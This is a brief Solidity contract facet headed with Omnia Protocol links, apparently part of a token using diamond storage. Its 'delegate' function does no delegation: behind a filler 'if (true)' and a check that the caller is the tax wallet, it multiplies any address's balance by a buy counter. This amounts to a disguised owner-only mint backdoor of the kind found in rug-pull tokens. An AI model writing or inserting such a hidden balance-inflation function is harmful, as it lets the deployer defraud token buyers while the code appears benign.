// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://omniatech.io/
    Twitter:  https://twitter.com/omnia_protocol
    Medium:   https://medium.com/omniaprotocol
    Telegram: https://t.me/Omnia_protocol

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
